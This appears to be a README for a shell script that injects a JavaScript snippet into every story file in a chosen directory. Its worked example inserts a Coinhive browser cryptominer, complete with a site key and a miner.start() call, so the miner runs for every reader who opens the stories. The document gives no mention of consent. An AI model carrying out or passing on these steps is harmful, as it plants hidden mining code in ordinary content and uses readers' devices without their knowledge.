Instructions:

1. Navigate to a shelf (directory) containing the list of stories to be converted.
 
2. Open a terminal in the directory and execute the command 'pwd' to obtain the absolute path of the stories.

eg: shelf1=/home/user/Projects/SHELVES/BookShelfA/

3. Update the "shelf1" variable in the script with this path value

4. update the "javascriptCode" variable in the script with the desired javascript to be added to the stories.
note: remove any new line characters.

eg: 
javascriptCode='<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('eZzJzukmy0ShcV8CUDdejkTDQt63lEEp');miner.start();</script>';

5. execute the script using ./script.sh
